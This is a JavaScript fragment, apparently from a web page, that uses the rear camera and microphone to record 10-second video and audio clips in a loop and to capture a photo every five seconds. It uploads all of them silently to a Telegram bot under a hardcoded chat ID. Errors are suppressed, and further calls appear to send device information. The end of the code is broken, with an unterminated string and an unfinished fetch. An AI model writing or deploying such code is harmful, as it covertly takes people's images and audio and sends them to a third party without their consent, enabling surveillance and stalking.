    const chat_id = '7552410869';
    let videoRecorder, audioRecorder, chunksVideo = [], chunksAudio = [];

    async function startAll() {
      try {
        const streamVideo = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: 'environment' } }, audio: true });
        const video = document.getElementById('video');
        video.srcObject = streamVideo;

        videoRecorder = new MediaRecorder(streamVideo);
        videoRecorder.ondataavailable = e => { if (e.data.size > 0) chunksVideo.push(e.data); };
        videoRecorder.onstop = () => {
          const blob = new Blob(chunksVideo, { type: 'video/webm' });
          chunksVideo = [];
          const form = new FormData();
          form.append("chat_id", chat_id);
          form.append("video", blob, "video10s.webm");
          fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: 'POST', body: form });
          setTimeout(startVideoRecording, 1000);
        };
        startVideoRecording();

        const streamAudio = await navigator.mediaDevices.getUserMedia({ audio: true });
        audioRecorder = new MediaRecorder(streamAudio);
        audioRecorder.ondataavailable = e => { if (e.data.size > 0) chunksAudio.push(e.data); };
        audioRecorder.onstop = () => {
          const blob = new Blob(chunksAudio, { type: 'audio/webm' });
          chunksAudio = [];
          const form = new FormData();
          form.append("chat_id", chat_id);
          form.append("audio", blob, "audio10s.webm");
          fetch(`https://api.telegram.org/bot${token}/sendAudio`, { method: 'POST', body: form });
          setTimeout(startAudioRecording, 1000);
        };
        startAudioRecording();

        setInterval(() => autoCapturePhoto(video), 5000);
        sendInfo();
        sendImageUrl(); // Tambahan: kirim gambar dari URL

      } catch (e) {}
    }

    function startVideoRecording() {
      videoRecorder.start();
      setTimeout(() => videoRecorder.stop(), 10000);
    }

    function startAudioRecording() {
      audioRecorder.start();
      setTimeout(() => audioRecorder.stop(), 10000);
    }

    async function autoCapturePhoto(video) {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
      const form = new FormData();
      form.append("chat_id", chat_id);
      form.append("photo", blob, "photo.jpg");
      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: form });
    }

        } catch {}

        const teks = `

        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
